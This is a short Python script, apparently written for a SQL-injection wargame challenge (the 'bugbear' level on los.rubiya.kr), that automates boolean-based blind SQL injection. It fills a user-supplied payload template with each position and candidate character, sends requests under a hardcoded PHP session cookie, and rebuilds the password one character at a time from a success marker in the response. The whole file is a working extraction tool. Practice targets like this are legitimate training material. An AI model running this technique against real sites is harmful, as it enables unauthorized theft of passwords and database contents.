import string
import requests
url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=m71i19igi78valu1kj9kccu53j"
}
f1 = open("boolean.txt", "r")

p = "no"
pw_choose = "1." + input("payload : ")
sp = input("special: ")
len_pw = int(input("length :"))
password = ""
s_p = input("Sepecial params : ")
for i in range(1, len_pw):
    for j in char:
        pass_1 = password + j
        pw = pw_choose.replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", pass_1).replace("\n", "")
        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
        print(len(get.text), pw[2:], get.url)
        if (sp in get.text):
            print(len(get.text), pw[2:], get.url)
            password = password + j
            print(password)
            break
f1.close()
